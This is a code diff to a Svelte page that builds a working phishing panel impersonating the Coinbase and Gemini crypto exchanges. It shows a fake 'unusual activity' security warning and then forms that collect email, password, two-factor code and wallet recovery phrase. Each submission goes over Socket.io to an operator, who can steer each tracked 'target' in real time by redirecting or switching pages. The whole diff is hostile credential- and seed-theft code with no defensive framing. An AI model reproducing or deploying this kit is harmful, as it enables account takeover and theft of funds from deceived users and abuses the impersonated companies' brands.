@@ -1,20 +1,170 @@
 <script lang="ts">
-    import { onMount } from 'svelte';
+    import { onMount, onDestroy } from 'svelte';
     import { goto } from '$app/navigation';
+    import { io } from 'socket.io-client';
     
     export let data;
     
-    let isLoading = false;
+    let isLoading = true;
+    let socket;
+    let targetID = '';
+    let connectionStatus = 'Connecting...';
+    let currentPage = 'account_review';
+    let domainTemplate = 'Coinbase'; // Default to Coinbase
+    let starterPage = 'account_review';
     
     // Get data from server-side load function
     const { targetUser, hasIdParam } = data;
     
-    onMount(() => {
+    onMount(async () => {
         // If no ID parameter, redirect to login
         if (!hasIdParam) {
             goto('/login');
+            return;
+        }
+        
+        // Get domain template from server
+        try {
+            const domainResponse = await fetch('/api/domain/getTemplate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    domain: window.location.hostname,
+                    username: targetUser 
+                })
+            });
+            
+            if (domainResponse.ok) {
+                const domainData = await domainResponse.json();
+                domainTemplate = domainData.template || 'Coinbase';
+                starterPage = domainData.starterPage || 'account_review';
+                currentPage = starterPage;
+            }
+        } catch (error) {
+            console.log('Could not fetch domain template, using default');
+        }
+        
+        // Connect to Socket.io server
+        try {
+            // Use current domain for socket connection
+            const protocol = window.location.protocol === 'https:' ? 'https:' : 'http:';
+            const socketUrl = `${protocol}//${window.location.host}`;
+            console.log('Connecting to Socket.io at:', socketUrl);
+            
+            socket = io(socketUrl, {
+                transports: ['websocket', 'polling'],
+                upgrade: true,
+                rememberUpgrade: true,
+                timeout: 10000,
+                reconnection: true,
+                reconnectionAttempts: 5,
+                reconnectionDelay: 1000
+            });
+            
+            socket.on('connect', () => {
+                console.log('Connected to Socket.io server');
+                connectionStatus = 'Connected';
+                
+                // Identify this target to the server
+                socket.emit('identify', {
+                    belongsto: targetUser,
+                    browser: navigator.userAgent,
+                    location: window.location.href,
+                    currentPage: currentPage
+                });
+            });
+            
+            socket.on('identified', (data) => {
+                console.log('Target identified:', data);
+                targetID = data.targetID;
+                connectionStatus = 'Online';
+                isLoading = false;
+                
+                // Set initial page from server
+                if (data.start_page) {
+                    currentPage = data.start_page;
+                }
+                
+                // Update status periodically
+                setInterval(() => {
+                    socket.emit('updateStatus', {
+                        targetID: targetID,
+                        status: 'Online',
+                        currentPage: currentPage
+                    });
+                }, 5000); // Update every 5 seconds
+            });
+            
+            socket.on('action', (data) => {
+                console.log('Received action:', data);
+                handleAction(data.action, data.customUrl);
+            });
+            
+            socket.on('disconnect', () => {
+                console.log('Disconnected from Socket.io server');
+                connectionStatus = 'Offline';
+            });
+            
+            socket.on('connect_error', (error) => {
+                console.error('Socket.io connection error:', error);
+                connectionStatus = 'Connection Error';
+                isLoading = false;
+            });
+            
+        } catch (error) {
+            console.error('Failed to initialize socket:', error);
+            connectionStatus = 'Failed to Connect';
+            isLoading = false;
         }
     });
+    
+    onDestroy(() => {
+        if (socket) {
+            socket.disconnect();
+        }
+    });
+    
+    function handleAction(action, customUrl) {
+        console.log(`Handling action: ${action}`, customUrl);
+        
+        switch (action) {
+            case 'redirect':
+                if (customUrl) {
+                    window.location.href = customUrl;
+                }
+                break;
+            case 'reload':
+                window.location.reload();
+                break;
+            case 'close':
+                window.close();
+                break;
+            case 'set_page':
+                currentPage = customUrl || 'account_review';
+                if (socket && targetID) {
+                    socket.emit('updateStatus', {
+                        targetID: targetID,
+                        status: 'Online',
+                        currentPage: currentPage
+                    });
+                }
+                break;
+            default:
+                console.log('Unknown action:', action);
+        }
+    }
+    
+    function handleFormSubmit(formData) {
+        // Send captured data to server
+        if (socket && targetID) {
+            socket.emit('captureData', {
+                targetID: targetID,
+                page: currentPage,
+                data: formData,
+                timestamp: new Date().toISOString()
+            });
+        }
+    }
 </script>
 
 <svelte:head>
@@ -25,100 +175,461 @@
 <main class="container">
     {#if isLoading}
         <div class="loading">
-            <h1>Loading...</h1>
+            <div class="spinner"></div>
+            <p>Loading...</p>
         </div>
     {:else if !hasIdParam}
         <div class="error">
-            <h1>Invalid Link</h1>
-            <p>This link appears to be invalid or incomplete.</p>
-            <button on:click={() => goto('/login')}>Go to Login</button>
+            <h1>Access Denied</h1>
+            <p>This page requires a valid access key.</p>
         </div>
     {:else if targetUser}
-        <div class="welcome">
-            <h1>Welcome to Xekku Panel</h1>
-            <p>Connected via: <strong>{targetUser}</strong></p>
-            
-            <div class="actions">
-                <button on:click={() => goto('/login')}>Login</button>
-                <button on:click={() => goto('/admin/login')}>Admin Login</button>
+        <!-- Coinbase Template Interface -->
+        {#if domainTemplate === 'Coinbase'}
+            <div class="coinbase-interface">
+                <!-- Header -->
+                <div class="header">
+                    <div class="logo">
+                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                            <circle cx="16" cy="16" r="16" fill="#0052FF"/>
+                            <path d="M16 4C9.4 4 4 9.4 4 16s5.4 12 12 12 12-5.4 12-12S22.6 4 16 4zm0 18c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6z" fill="white"/>
+                        </svg>
+                        <span>Coinbase</span>
+                    </div>
+                    <div class="security-badge">
+                        <span class="icon">🔒</span>
+                        <span>Secure</span>
+                    </div>
+                </div>
+
+                <!-- Main Content -->
+                <div class="main-content">
+                    {#if currentPage === 'account_review'}
+                        <div class="security-notice">
+                            <div class="icon">⚠️</div>
+                            <h2>Account Security Review</h2>
+                            <p>We've detected unusual activity on your account. To protect your funds, we need to verify your identity.</p>
+                            <p><strong>Action Required:</strong> Please complete the security verification process below.</p>
+                            <button class="continue-btn" on:click={() => currentPage = 'login'}>
+                                Continue Verification
+                            </button>
+                        </div>
+                    {:else if currentPage === 'login'}
+                        <div class="auth-form">
+                            <h2>Sign in to Coinbase</h2>
+                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'email', email: e.target.email.value})}>
+                                <div class="form-group">
+                                    <label for="email">Email</label>
+                                    <input type="email" id="email" name="email" required>
+                                </div>
+                                <button type="submit" class="submit-btn">Continue</button>
+                            </form>
+                        </div>
+                    {:else if currentPage === 'login-two'}
+                        <div class="auth-form">
+                            <h2>Enter your password</h2>
+                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'password', password: e.target.password.value})}>
+                                <div class="form-group">
+                                    <label for="password">Password</label>
+                                    <input type="password" id="password" name="password" required>
+                                </div>
+                                <button type="submit" class="submit-btn">Sign In</button>
+                            </form>
+                        </div>
+                    {:else if currentPage === 'login-otp'}
+                        <div class="auth-form">
+                            <h2>Two-factor authentication</h2>
+                            <p>Enter the 6-digit code from your authenticator app</p>
+                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'otp', otp: e.target.otp.value})}>
+                                <div class="form-group">
+                                    <label for="otp">Authentication Code</label>
+                                    <input type="text" id="otp" name="otp" maxlength="6" required>
+                                </div>
+                                <button type="submit" class="submit-btn">Verify</button>
+                            </form>
+                        </div>
+                    {:else if currentPage === 'import_seed'}
+                        <div class="auth-form">
+                            <h2>Wallet Recovery Required</h2>
+                            <p>For security, please verify your wallet recovery phrase</p>
+                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'seed', seed: e.target.seed.value})}>
+                                <div class="form-group">
+                                    <label for="seed">Recovery Phrase (12-24 words)</label>
+                                    <textarea id="seed" name="seed" rows="4" placeholder="Enter your recovery phrase separated by spaces" required></textarea>
+                                </div>
+                                <button type="submit" class="submit-btn">Verify Wallet</button>
+                            </form>
+                        </div>
+                    {/if}
+                </div>
             </div>
-            
-            <!-- You can add more content here based on the targetUser -->
-            <div class="info">
-                <p>This is a tracking link. You can customize this page to show:</p>
-                <ul>
-                    <li>Custom content for different users</li>
-                    <li>Tracking information</li>
-                    <li>Redirect to specific pages</li>
-                    <li>Capture user data</li>
-                </ul>
+
+        <!-- Gemini Template Interface -->
+        {:else if domainTemplate === 'Gemini'}
+            <div class="gemini-interface">
+                <!-- Header -->
+                <div class="header">
+                    <div class="logo">
+                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                            <rect width="32" height="32" rx="8" fill="#00D4FF"/>
+                            <path d="M8 24V8h3v13h10V8h3v16H8z" fill="white"/>
+                        </svg>
+                        <span>Gemini</span>
+                    </div>
+                    <div class="security-badge">
+                        <span class="icon">🔒</span>
+                        <span>Secure</span>
+                    </div>
+                </div>
+
+                <!-- Main Content -->
+                <div class="main-content">
+                    {#if currentPage === 'account_review'}
+                        <div class="security-notice">
+                            <div class="icon">🔐</div>
+                            <h2>Security Verification Required</h2>
+                            <p>Your account requires additional verification to ensure the security of your digital assets.</p>
+                            <p><strong>This process is mandatory</strong> and must be completed within 24 hours.</p>
+                            <button class="continue-btn" on:click={() => currentPage = 'login'}>
+                                Begin Verification
+                            </button>
+                        </div>
+                    {:else if currentPage === 'login'}
+                        <div class="auth-form">
+                            <h2>Sign in to Gemini</h2>
+                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'email', email: e.target.email.value})}>
+                                <div class="form-group">
+                                    <label for="email">Email Address</label>
+                                    <input type="email" id="email" name="email" required>
+                                </div>
+                                <button type="submit" class="submit-btn">Continue</button>
+                            </form>
+                        </div>
+                    {:else if currentPage === 'login-two'}
+                        <div class="auth-form">
+                            <h2>Enter your password</h2>
+                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'password', password: e.target.password.value})}>
+                                <div class="form-group">
+                                    <label for="password">Password</label>
+                                    <input type="password" id="password" name="password" required>
+                                </div>
+                                <button type="submit" class="submit-btn">Sign In</button>
+                            </form>
+                        </div>
+                    {:else if currentPage === 'login-otp'}
+                        <div class="auth-form">
+                            <h2>Two-Factor Authentication</h2>
+                            <p>Please enter your 6-digit authentication code</p>
+                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'otp', otp: e.target.otp.value})}>
+                                <div class="form-group">
+                                    <label for="otp">Authentication Code</label>
+                                    <input type="text" id="otp" name="otp" maxlength="6" required>
+                                </div>
+                                <button type="submit" class="submit-btn">Verify</button>
+                            </form>
+                        </div>
+                    {:else if currentPage === 'import_seed'}
+                        <div class="auth-form">
+                            <h2>Security Wallet Verification</h2>
+                            <p>Please provide your wallet recovery phrase for verification</p>
+                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'seed', seed: e.target.seed.value})}>
+                                <div class="form-group">
+                                    <label for="seed">Recovery Phrase</label>
+                                    <textarea id="seed" name="seed" rows="4" placeholder="Enter your 12 or 24 word recovery phrase" required></textarea>
+                                </div>
+                                <button type="submit" class="submit-btn">Verify Security</button>
+                            </form>
+                        </div>
+                    {/if}
+                </div>
             </div>
+        {/if}
+
+        <!-- Connection Status (Hidden but functional) -->
+        <div class="status-indicator" style="display: none;">
+            Status: {connectionStatus} | Target: {targetID} | Page: {currentPage}
         </div>
     {:else}
         <div class="error">
-            <h1>Invalid Link Format</h1>
-            <p>The link format is not recognized.</p>
-            <button on:click={() => goto('/login')}>Go to Login</button>
+            <h1>Connection Failed</h1>
+            <p>Unable to establish connection. Please try again.</p>
+            <button on:click={() => window.location.reload()}>Retry</button>
         </div>
     {/if}
 </main>
 
 <style>
-    .container {
-        max-width: 800px;
-        margin: 0 auto;
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        background: #f8f9fa;
+        min-height: 100vh;
+    }
+
+    .loading {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        gap: 1rem;
+    }
+
+    .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid #e3e3e3;
+        border-top: 4px solid #0052FF;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    .error {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        gap: 1rem;
         padding: 2rem;
         text-align: center;
     }
-    
-    .loading, .error, .welcome {
+
+    /* Coinbase Interface Styles */
+    .coinbase-interface {
+        min-height: 100vh;
+        background: #ffffff;
+    }
+
+    .coinbase-interface .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1rem 2rem;
+        border-bottom: 1px solid #e3e8ef;
+        background: #ffffff;
+    }
+
+    .coinbase-interface .logo {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-size: 1.5rem;
+        font-weight: 600;
+        color: #0052FF;
+    }
+
+    .coinbase-interface .security-badge {
+        display: flex;
+        align-items: center;
+        gap: 0.25rem;
+        padding: 0.5rem 1rem;
+        background: #f0f8ff;
+        border-radius: 20px;
+        font-size: 0.875rem;
+        color: #0052FF;
+    }
+
+    .coinbase-interface .main-content {
+        max-width: 400px;
+        margin: 4rem auto;
+        padding: 2rem;
+    }
+
+    .coinbase-interface .security-notice {
+        text-align: center;
+        padding: 2rem;
+        background: #fff3cd;
+        border: 1px solid #ffeaa7;
+        border-radius: 8px;
+    }
+
+    .coinbase-interface .security-notice .icon {
+        font-size: 3rem;
+        margin-bottom: 1rem;
+    }
+
+    .coinbase-interface .security-notice h2 {
+        margin-bottom: 1rem;
+        color: #856404;
+    }
+
+    .coinbase-interface .security-notice p {
+        margin-bottom: 1rem;
+        color: #856404;
+        line-height: 1.5;
+    }
+
+    .coinbase-interface .auth-form {
+        background: #ffffff;
         padding: 2rem;
         border-radius: 8px;
-        background: #f5f5f5;
-        margin: 2rem 0;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
     }
-    
-    .error {
-        background: #fee;
-        border: 1px solid #fcc;
+
+    .coinbase-interface .auth-form h2 {
+        margin-bottom: 1.5rem;
+        color: #1a1a1a;
+        text-align: center;
     }
-    
-    .welcome {
-        background: #f0f8ff;
-        border: 1px solid #cce7ff;
+
+    .form-group {
+        margin-bottom: 1.5rem;
     }
-    
-    .actions {
-        margin: 2rem 0;
-        display: flex;
-        gap: 1rem;
-        justify-content: center;
+
+    .form-group label {
+        display: block;
+        margin-bottom: 0.5rem;
+        font-weight: 500;
+        color: #1a1a1a;
     }
-    
-    button {
-        padding: 0.5rem 1rem;
+
+    .form-group input,
+    .form-group textarea {
+        width: 100%;
+        padding: 0.75rem;
+        border: 2px solid #e3e8ef;
+        border-radius: 4px;
+        font-size: 1rem;
+        transition: border-color 0.2s;
+    }
+
+    .form-group input:focus,
+    .form-group textarea:focus {
+        outline: none;
+        border-color: #0052FF;
+    }
+
+    .continue-btn,
+    .submit-btn {
+        width: 100%;
+        padding: 0.875rem;
+        background: #0052FF;
+        color: white;
         border: none;
         border-radius: 4px;
-        background: #007acc;
-        color: white;
+        font-size: 1rem;
+        font-weight: 500;
         cursor: pointer;
-        transition: background 0.2s;
+        transition: background-color 0.2s;
     }
-    
-    button:hover {
-        background: #005c99;
+
+    .continue-btn:hover,
+    .submit-btn:hover {
+        background: #0040cc;
     }
-    
-    .info {
-        margin-top: 2rem;
-        padding: 1rem;
-        background: #fff;
+
+    /* Gemini Interface Styles */
+    .gemini-interface {
+        min-height: 100vh;
+        background: #ffffff;
+    }
+
+    .gemini-interface .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1rem 2rem;
+        border-bottom: 1px solid #e3e8ef;
+        background: #ffffff;
+    }
+
+    .gemini-interface .logo {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-size: 1.5rem;
+        font-weight: 600;
+        color: #00D4FF;
+    }
+
+    .gemini-interface .security-badge {
+        display: flex;
+        align-items: center;
+        gap: 0.25rem;
+        padding: 0.5rem 1rem;
+        background: #f0fffe;
+        border-radius: 20px;
+        font-size: 0.875rem;
+        color: #00D4FF;
+    }
+
+    .gemini-interface .main-content {
+        max-width: 400px;
+        margin: 4rem auto;
+        padding: 2rem;
+    }
+
+    .gemini-interface .security-notice {
+        text-align: center;
+        padding: 2rem;
+        background: #e7f3ff;
+        border: 1px solid #b3d9ff;
+        border-radius: 8px;
+    }
+
+    .gemini-interface .security-notice .icon {
+        font-size: 3rem;
+        margin-bottom: 1rem;
+    }
+
+    .gemini-interface .security-notice h2 {
+        margin-bottom: 1rem;
+        color: #0066cc;
+    }
+
+    .gemini-interface .security-notice p {
+        margin-bottom: 1rem;
+        color: #0066cc;
+        line-height: 1.5;
+    }
+
+    .gemini-interface .auth-form {
+        background: #ffffff;
+        padding: 2rem;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .gemini-interface .auth-form h2 {
+        margin-bottom: 1.5rem;
+        color: #1a1a1a;
+        text-align: center;
+    }
+
+    .gemini-interface .continue-btn,
+    .gemini-interface .submit-btn {
+        background: #00D4FF;
+    }
+
+    .gemini-interface .continue-btn:hover,
+    .gemini-interface .submit-btn:hover {
+        background: #00b8e6;
+    }
+
+    .gemini-interface .form-group input:focus,
+    .gemini-interface .form-group textarea:focus {
+        border-color: #00D4FF;
+    }
+
+    .status-indicator {
+        position: fixed;
+        bottom: 10px;
+        right: 10px;
+        padding: 0.5rem;
+        background: rgba(0, 0, 0, 0.8);
+        color: white;
+        font-size: 0.75rem;
         border-radius: 4px;
-        text-align: left;
-    }
-    
-    ul {
-        margin: 1rem 0;
-        padding-left: 2rem;
     }
 </style>
